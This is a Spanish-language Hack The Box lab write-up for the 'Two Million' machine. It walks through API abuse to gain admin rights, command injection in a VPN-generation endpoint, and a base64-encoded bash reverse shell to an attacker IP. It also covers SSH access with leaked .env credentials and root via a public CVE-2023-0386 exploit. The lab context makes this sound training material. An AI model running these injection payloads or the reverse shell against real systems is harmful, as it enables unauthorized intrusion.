---
title: "Two Million - Easy (HTB)"
date: 2025-07-19
categories: [Writeups, HackTheBox]
tags: [HTB, API, Privilege Escalation, CVE-2023-0386, ROT13, BurpSuite]
description: "Writeup completo de la máquina Two Million (Easy) de Hack The Box, explotando APIs mal protegidas, inyecciones y escalada de privilegios con CVE-2023-0386."
---

# Two Million - Easy  

Fecha: 04-05-2025  
Estado: Resuelta  

---

## Reconocimiento

Arrancamos con el clásico escaneo de puertos para conocer qué servicios están disponibles y abiertos en la máquina objetivo. Usamos `nmap` con opciones agresivas para que el escaneo sea rápido pero efectivo:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.221
````

Resultado:

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Solo dos puertos abiertos, nada raro: SSH para acceso remoto y HTTP para la web. Esto ya reduce el campo de juego, porque sabemos que aquí hay que escarbar en la web y luego intentar algo con SSH.

Luego, hacemos un escaneo más detallado con detección de versiones para saber qué software exacto corre detrás:

```bash
nmap -p22,80 -sCV 10.10.11.221
```

El resultado nos muestra:

```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Detectamos que el servidor web usa nginx y redirige a un dominio interno `2million.htb`. Esto nos indica que la máquina está configurada con virtual hosts y hay que ajustar nuestro archivo hosts local para poder acceder a esa web correctamente.

![FotoUno](/assets/img/two-millions/Pasted%20image%2020250505002546.png)

---

## Desofuscando el JS

Al meternos en la página, notamos que algunas funciones no están visibles a simple vista, pero al inspeccionar el código fuente encontramos un archivo JavaScript ofuscado con un `eval` que nos llama la atención.

Usamos herramientas para desofuscar el JS y descubrimos que contiene funciones interesantes:

* `verifyInviteCode(code)`: envía un POST a `/api/v1/invite/verify` para verificar códigos de invitación.
* `makeInviteCode()`: envía un POST a `/api/v1/invite/how/to/generate` para generar códigos de invitación.

Esto nos revela que la aplicación tiene rutas API internas que podemos probar manualmente, lo cual ya nos pone en la pista de una API mal protegida que podemos explotar.

---

## Generando código de invitación

Probamos la ruta que genera el código con un simple `curl`:

```bash
curl -X POST http://2million.htb/api/v1/invite/how/to/generate -H "Content-Type: application/json"
```

Respuesta:

```json
{
  "0":200,
  "success":1,
  "data":{
    "data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype":"ROT13"
  },
  "hint":"Data is encrypted ... check encryption type..."
}
```

Aquí la respuesta está cifrada con ROT13, algo sencillo pero que denota que el equipo quiso poner una "capa extra" para ocultar rutas. Desciframos y obtenemos:

```
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

La típica pista que no esperábamos, pero bienvenida. Así que seguimos con la siguiente petición:

```bash
curl -X POST http://2million.htb/api/v1/invite/generate -H "Content-Type: application/json"
```

Y recibimos:

```
{"0":200,"success":1,"data":{"code":"OFZDRTktV0xMV1UtM1pLOFMtUEg0Wlg="}}
```

Un código base64 que nos permite registrar un usuario. Esto ya nos pone dentro del sistema con un usuario válido, sin tener que adivinar credenciales.

![FotoDos](/assets/img/two-millions/Pasted%20image%2020250505002531.png)

---

## Enumerando más APIs

Con Burp Suite empezamos a mapear más rutas y nos topamos con rutas bajo `/api/v1/admin`. Nos fijamos en `/api/v1/admin/settings/update` y, para sorpresa, acepta métodos GET, POST y PUT, lo que indica una mala configuración.

![FotoTres](/assets/img/two-millions/Pasted%20image%2020250505004956.png)

Intentamos una inyección básica para ver si podemos escalar privilegios:

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  -H "Content-Type: application/json" \
  -H "Cookie: PHPSESSID=XXXX" \
  -d '{
    "email": "test@test.com",
    "is_admin": 1,
    "setting": "test; cat /etc/passwd"
  }'
```

Respuesta:

```json
{"id":13,"username":"test","is_admin":1}
```

Boom. Cambiamos el flag `is_admin` a 1 directamente, con lo que nuestro usuario ya tiene privilegios administrativos, sin validación ni seguridad. Esto es una falla grave que ya abre muchas puertas.

---

## RCE y Reverse Shell

Con privilegios admin, probamos si podemos ejecutar comandos arbitrarios usando la API de generación de VPN, que aceptaba parámetros sin filtrar:

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  --cookie "PHPSESSID=XXXX" \
  --header "Content-Type: application/json" \
  --data '{"username":"test;id;"}'
```

Respuesta:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

¡Listo! Confirmamos ejecución remota de comandos (RCE). Ahora el siguiente paso es subir una reverse shell para control total.

Codificamos el payload en base64 para evitar problemas de caracteres y lo ejecutamos:

```bash
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDQ0IDA+JjE=' | base64 -d | bash
```

Luego mandamos la orden para ejecutar esto desde la API:

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  --cookie "PHPSESSID=XXXX" \
  --header "Content-Type: application/json" \
  --data '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDQ0IDA+JjE= | base64 -d | bash;"}'
```

Y voilà: shell remota con permisos de www-data. Desde aquí podemos explorar la máquina con tranquilidad.

---

## Credenciales en `.env`

En la raíz de la aplicación encontramos un archivo `.env` con credenciales en texto plano, un clásico error de seguridad:

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

El archivo nos da credenciales para la base de datos y probablemente para el usuario `admin`. Verificamos el usuario en `/etc/passwd`:

```
admin:x:1000:1000::/home/admin:/bin/bash
```

Intentamos conexión SSH usando esas credenciales:

```bash
ssh admin@10.10.11.221
# password: SuperDuperPass123
```

Acceso concedido. Ya tenemos la flag de usuario:

```
cat user.txt
b57dfb3467db8c5447c289ba9b8a85e1
```

Nada mal, un acceso limpio y sin complicaciones.

---

## Escalada de privilegios

Explorando más encontramos un email interno que menciona la vulnerabilidad **OverlayFS CVE-2023-0386**, conocida por permitir escalada de privilegios:

```
That one in OverlayFS / FUSE looks nasty...
```

Confirmamos versión vulnerable del kernel:

```bash
uname -a
Linux 2million 5.15.70-051570-generic #20220923 ...
```

Descargamos y compilamos el exploit público:

```bash
zip -r cve.zip CVE-2023-0386/
scp cve.zip admin@2million.htb:/tmp
unzip cve.zip
cd CVE-2023-0386 && make all
./fuse ./ovlcap/lower ./gc &
./exp
```

Tras ejecutar, mensaje de éxito:

```
[+] exploit success!
```

Ahora somos root. Nos vamos directo a `/root/` y leemos la flag final:

```
cat /root/root.txt
```

---

## Resumen

* **Enumeración** → Encontramos APIs ocultas y rutas cifradas con ROT13, que fueron la puerta de entrada.
* **Explotación API** → Escalamos privilegios alterando parámetros sin protección.
* **RCE** → Comandos arbitrarios en la generación de VPN, conseguimos shell remota.
* **LFI y credenciales** → Archivo `.env` con password admin nos dio acceso SSH.
* **Escalada final** → Usamos CVE-2023-0386 para escalar a root.

Una máquina sencilla pero didáctica, que combina malas configuraciones de API con una vulnerabilidad real de kernel para escalar. Ideal para aprender a no confiar en capas superficiales y siempre validar todo.

---

¿Quieres más writeups así? Sígueme en [LinkedIn](https://www.linkedin.com/in/roberto-luzanilla-b02061259/) o checa mi blog para estar al día y mejorar tus skills.

